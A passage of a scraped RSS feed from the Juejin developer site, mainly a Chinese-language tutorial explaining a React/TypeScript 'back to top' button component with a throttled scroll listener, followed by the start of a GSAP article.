</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入解析 React 回到顶部（BackToTop）组件的实现与设计]]></title>    <link>https://juejin.cn/post/7605811866908459017</link>    <guid>https://juejin.cn/post/7605811866908459017</guid>    <pubDate>2026-02-13T02:37:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605811866908459017" data-draft-id="7605782093482835994" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入解析 React 回到顶部（BackToTop）组件的实现与设计"/> <meta itemprop="keywords" content="前端,React.js,TypeScript"/> <meta itemprop="datePublished" content="2026-02-13T02:37:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冻梨政哥"/> <meta itemprop="url" content="https://juejin.cn/user/2373184444182659"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入解析 React 回到顶部（BackToTop）组件的实现与设计
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2373184444182659/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冻梨政哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:37:04.000Z" title="Fri Feb 13 2026 02:37:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">深入解析 React 回到顶部（BackToTop）组件的实现与设计</h2>
<p>在现代网页开发中，长页面的场景十分常见，为了提升用户体验，“回到顶部” 功能几乎成为标配。本文将基于一段 React 实现的 BackToTop 组件代码，从结构、核心逻辑、性能优化等维度，全面解析该组件的设计与实现细节。</p>
<h3 data-id="heading-1">一、组件整体结构概览</h3>
<p>首先来看 BackToTop 组件的完整代码结构，该组件基于 React 函数式组件实现，核心依赖 React 的 Hooks、UI 组件库、图标库以及自定义的节流工具函数，整体结构清晰且模块化。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { useEffect, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ui/button'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ArrowUp</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"lucide-react"</span>;
<span class="hljs-keyword">import</span> { throttle } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/utils"</span>;

<span class="hljs-comment">// 定义组件Props类型</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">BackToTopProps</span> {
    <span class="hljs-comment">// 滚动超过多少像素后显示按钮</span>
    threshold?: <span class="hljs-built_in">number</span>
}

<span class="hljs-comment">// 函数式组件，设置threshold默认值为400</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">BackToTop</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">BackToTopProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">{
    threshold = <span class="hljs-number">400</span>
}</span>) =&gt;</span> {
    <span class="hljs-comment">// 状态管理：控制按钮是否可见</span>
    <span class="hljs-keyword">const</span> [isVisible, setIsVisible] = useState&lt;<span class="hljs-built_in">boolean</span>&gt;(<span class="hljs-literal">false</span>);
    
    <span class="hljs-comment">// 回到顶部核心逻辑</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">scrollTop</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>({
            <span class="hljs-attr">top</span>: <span class="hljs-number">0</span>,
            <span class="hljs-attr">behavior</span>:<span class="hljs-string">'smooth'</span>
        })
    }
    
    <span class="hljs-comment">// 监听滚动事件，控制按钮显示/隐藏</span>
    <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleVisibility</span> = (<span class="hljs-params"/>) =&gt; {
            <span class="hljs-title function_">setIsVisible</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span> &gt; threshold);
        }
        <span class="hljs-comment">// 节流处理滚动监听函数</span>
        <span class="hljs-keyword">const</span> thtottled_func = <span class="hljs-title function_">throttle</span>(toggleVisibility,<span class="hljs-number">200</span>);
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, thtottled_func);
        <span class="hljs-comment">// 清理副作用：移除滚动监听</span>
        <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'scroll'</span>, thtottled_func);
    },[threshold])
    
    <span class="hljs-comment">// 条件渲染：未达到阈值时不渲染组件</span>
    <span class="hljs-keyword">if</span>(!isVisible) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    
    <span class="hljs-comment">// 组件UI渲染</span>
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">variant</span>=<span class="hljs-string">"outline"</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"icon"</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{scrollTop}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"fixed bottom-6 right-6 rounded-full shadow-lg hover:shadow-xl z-50"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">ArrowUp</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"h-4 w-4"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span></span>
    )
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">BackToTop</span>
</code></pre>
<p>组件整体可分为 5 个核心部分：</p>
<ol>
<li>依赖导入与类型定义；</li>
<li>状态管理（控制按钮可见性）；</li>
<li>回到顶部核心逻辑；</li>
<li>滚动事件监听与性能优化；</li>
<li>条件渲染与 UI 展示。</li>
</ol>
<h3 data-id="heading-2">二、核心功能逐行解析</h3>
<h4 data-id="heading-3">1. 类型定义与 Props 设计</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">BackToTopProps</span> {
    threshold?: <span class="hljs-built_in">number</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">BackToTop</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">BackToTopProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">{
    threshold = <span class="hljs-number">400</span>
}</span>) =&gt;</span> { ... }
</code></pre>
<ul>
<li>定义<code>BackToTopProps</code>接口，仅暴露<code>threshold</code>可选属性，用于配置 “滚动超过多少像素后显示按钮”，符合 “最小可用 API” 设计原则；</li>
<li>通过解构赋值为<code>threshold</code>设置默认值 400，确保组件在未传入参数时仍能正常工作。</li>
</ul>
<h4 data-id="heading-4">2. 状态管理：控制按钮可见性</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> [isVisible, setIsVisible] = <span class="hljs-built_in">useState</span>&lt;<span class="hljs-type">boolean</span>&gt;(<span class="hljs-literal">false</span>);
</code></pre>
<p>使用<code>useState</code> Hook 创建布尔类型状态<code>isVisible</code>，初始值为<code>false</code>（页面加载时按钮默认隐藏），该状态用于控制组件的条件渲染。</p>
<h4 data-id="heading-5">3. 回到顶部逻辑：平滑滚动实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">scrollTop</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>({
        <span class="hljs-attr">top</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">behavior</span>:<span class="hljs-string">'smooth'</span>
    })
}
</code></pre>
<ul>
<li>调用<code>window.scrollTo</code>方法实现滚动到页面顶部；</li>
<li>通过配置<code>behavior: 'smooth'</code>实现平滑滚动，替代传统的瞬间跳转，提升用户体验；</li>
<li>该函数作为按钮的点击事件回调，触发回到顶部操作。</li>
</ul>
<h4 data-id="heading-6">4. 滚动监听与性能优化（核心）</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleVisibility</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-title function_">setIsVisible</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span> &gt; threshold);
    }
    <span class="hljs-keyword">const</span> thtottled_func = <span class="hljs-title function_">throttle</span>(toggleVisibility,<span class="hljs-number">200</span>);
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, thtottled_func);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'scroll'</span>, thtottled_func);
},[threshold])
</code></pre>
<p>这是组件的核心逻辑，需重点解析：</p>
<h5 data-id="heading-7">（1）滚动监听函数<code>toggleVisibility</code></h5>
<p><code>toggleVisibility</code>的作用是判断页面滚动距离（<code>window.scrollY</code>）是否超过阈值（<code>threshold</code>），并通过<code>setIsVisible</code>更新按钮可见状态。</p>
<h5 data-id="heading-8">（2）节流处理的必要性</h5>
<p><code>scroll</code>事件是高频触发事件（页面滚动时会连续触发），若直接将<code>toggleVisibility</code>绑定到<code>scroll</code>事件，会导致该函数被频繁调用，引发不必要的状态更新和重渲染，影响页面性能。</p>
<p>因此，组件通过<code>throttle</code>工具函数对<code>toggleVisibility</code>进行节流处理，设置 200ms 的节流间隔 —— 即滚动事件触发时，<code>toggleVisibility</code>最多每 200ms 执行一次，有效减少函数执行次数，优化性能。</p>
<h5 data-id="heading-9">（3）副作用的挂载与清理</h5>
<ul>
<li><code>useEffect</code>在组件挂载时执行，为<code>window</code>添加<code>scroll</code>事件监听，绑定节流后的函数；</li>
<li><code>useEffect</code>的返回值是一个清理函数，在组件卸载时执行，移除<code>scroll</code>事件监听 —— 避免内存泄漏，是 React 函数式组件处理事件监听的标准写法；</li>
<li><code>useEffect</code>的依赖数组包含<code>threshold</code>，确保当阈值变化时，重新绑定监听函数。</li>
</ul>
<h4 data-id="heading-10">5. 条件渲染与 UI 展示</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span>(!isVisible) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

<span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">variant</span>=<span class="hljs-string">"outline"</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"icon"</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{scrollTop}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"fixed bottom-6 right-6 rounded-full shadow-lg hover:shadow-xl z-50"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ArrowUp</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"h-4 w-4"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span></span>
)
</code></pre>
<ul>
<li>
<p>条件渲染：当<code>isVisible</code>为<code>false</code>时，组件返回<code>null</code>，不渲染任何内容；仅当滚动距离超过阈值时，才渲染回到顶部按钮；</p>
</li>
<li>
<p>UI 设计细节：</p>
<ul>
<li>使用 UI 组件库的<code>Button</code>组件，设置<code>variant="outline"</code>（轮廓样式）、<code>size="icon"</code>（图标尺寸）；</li>
<li>通过<code>className</code>设置固定定位（<code>fixed</code>）、位置（<code>bottom-6 right-6</code>，右下角）、圆角（<code>rounded-full</code>）、阴影（<code>shadow-lg/xl</code>）、层级（<code>z-50</code>），确保按钮悬浮在页面最上层且样式美观；</li>
<li>嵌入<code>lucide-react</code>的<code>ArrowUp</code>图标作为按钮内容，直观传达 “回到顶部” 的功能；</li>
<li>按钮绑定<code>onClick</code>事件，触发<code>scrollTop</code>函数。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-11">三、节流工具函数（throttle）解析</h3>
<p>组件依赖的<code>throttle</code>函数位于<code>index.ts</code>中，其实现如下：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ThrottleFunction</span> = <span class="hljs-function">(<span class="hljs-params">...args: <span class="hljs-built_in">any</span>[]</span>) =&gt;</span> <span class="hljs-built_in">void</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">throttle</span>(<span class="hljs-params">fun: ThrottleFunction, delay: <span class="hljs-built_in">number</span></span>): <span class="hljs-title class_">ThrottleFunction</span> {
  <span class="hljs-keyword">let</span> <span class="hljs-attr">last</span>: <span class="hljs-built_in">number</span> | <span class="hljs-literal">undefined</span>;
  <span class="hljs-keyword">let</span> <span class="hljs-attr">deferTimer</span>: <span class="hljs-title class_">NodeJS</span>.<span class="hljs-property">Timeout</span> | <span class="hljs-literal">undefined</span>;

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">...args: <span class="hljs-built_in">any</span>[]</span>) {
    <span class="hljs-keyword">const</span> now = +<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();

    <span class="hljs-keyword">if</span> (last &amp;&amp; now &lt; last + delay) {
      <span class="hljs-built_in">clearTimeout</span>(deferTimer);
      deferTimer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        last = now;
        <span class="hljs-title function_">fun</span>(args);
      }, delay);
    } <span class="hljs-keyword">else</span> {
      last = now;
      <span class="hljs-title function_">fun</span>(args);
    }
  };
}
</code></pre>
<h4 data-id="heading-12">节流函数的核心原理</h4>
<p>节流（Throttle）的核心思想是：<strong>在指定时间间隔内，只允许函数执行一次</strong>，即使触发多次，也仅生效一次。该实现的关键逻辑：</p>
<ol>
<li>
<p>定义<code>last</code>（上一次函数执行的时间戳）和<code>deferTimer</code>（延迟定时器）两个闭包变量，用于记录执行状态；</p>
</li>
<li>
<p>每次触发函数时，获取当前时间戳<code>now</code>；</p>
</li>
<li>
<p>若距离上一次执行时间不足<code>delay</code>：</p>
<ul>
<li>清除原有定时器，避免重复执行；</li>
<li>重新设置定时器，延迟<code>delay</code>后执行函数，并更新<code>last</code>；</li>
</ul>
</li>
<li>
<p>若距离上一次执行时间超过<code>delay</code>：直接执行函数，并更新<code>last</code>。</p>
</li>
</ol>
<h4 data-id="heading-13">注意点</h4>
<p>该实现中<code>fun(args)</code>的传参方式需注意 —— 原函数的参数通过数组形式传递，若原函数依赖参数解构，需确保传参逻辑匹配（本文中<code>toggleVisibility</code>无参数，因此无影响）。</p>
<h3 data-id="heading-14">四、组件的使用与扩展</h3>
<h4 data-id="heading-15">1. 基础使用</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">BackToTop</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/BackToTop'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      {/* 其他页面内容 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">BackToTop</span> <span class="hljs-attr">threshold</span>=<span class="hljs-string">{500}</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p>仅需引入组件，可通过<code>threshold</code>自定义显示阈值，开箱即用。</p>
<h4 data-id="heading-16">2. 扩展方向</h4>
<ul>
<li><strong>自定义样式</strong>：通过<code>className</code>覆盖默认样式，或新增<code>className</code> Props 支持自定义样式；</li>
<li><strong>自定义图标</strong>：将图标作为 Props 传入，支持替换为自定义图标；</li>
<li><strong>滚动目标</strong>：扩展 Props 支持滚动到指定元素（而非仅顶部）；</li>
<li><strong>动画效果</strong>：添加按钮显示 / 隐藏的过渡动画（如 React Transition Group）；</li>
<li><strong>移动端适配</strong>：针对移动端调整按钮尺寸和位置；</li>
<li><strong>无障碍访问（a11y）</strong> ：添加<code>aria-label</code>等属性，提升无障碍体验。</li>
</ul>
<h3 data-id="heading-17">五、总结</h3>
<p>本文解析的 BackToTop 组件是一个典型的 “小而美” 的 React 组件，其设计具备以下优点：</p>
<ol>
<li><strong>类型安全</strong>：通过 TypeScript 定义 Props 接口，确保类型校验；</li>
<li><strong>性能优化</strong>：使用节流处理高频滚动事件，避免性能损耗；</li>
<li><strong>用户体验</strong>：平滑滚动、条件渲染、美观的 UI 设计；</li>
<li><strong>可维护性</strong>：模块化结构、清晰的逻辑拆分、完善的副作用清理；</li>
<li><strong>可扩展性</strong>：通过 Props 暴露核心配置，便于扩展。</li>
</ol>
<p>该组件的实现思路不仅适用于 “回到顶部” 功能，也可迁移到其他需要监听滚动事件的场景（如导航栏吸顶、懒加载等），是 React 函数式组件开发的典型实践案例。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[gsap 配置解读 --1]]></title>    <link>https://juejin.cn/post/7605985547568758790</link>    <guid>https://juejin.cn/post/7605985547568758790</guid>    <pubDate>2026-02-13T02:56:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605985547568758790" data-draft-id="7605792874173268031" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="gsap  配置解读 --1"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-13T02:56:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大时光"/> <meta itemprop="url" content="https://juejin.cn/user/2529296311138013"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            gsap  配置解读 --1
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2529296311138013/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大时光
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:56:59.000Z" title="Fri Feb 13 2026 02:56:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body 